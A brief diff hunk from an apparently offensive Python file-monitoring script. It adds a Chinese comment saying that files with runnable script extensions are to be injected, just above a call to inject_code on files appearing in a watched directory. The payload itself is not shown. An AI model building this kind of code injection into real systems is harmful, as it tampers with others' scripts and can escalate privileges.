@@ -100,6 +100,7 @@ def start_monitor(path_to_watch):
 
                     # 文件和文件扩展名分离
                     filename, extension = os.path.splitext(full_filename)
+                    # 如果是可以运行的脚本文件扩张名，则注入
                     if extension in file_types:
                         inject_code(full_filename, extension, contents)
 
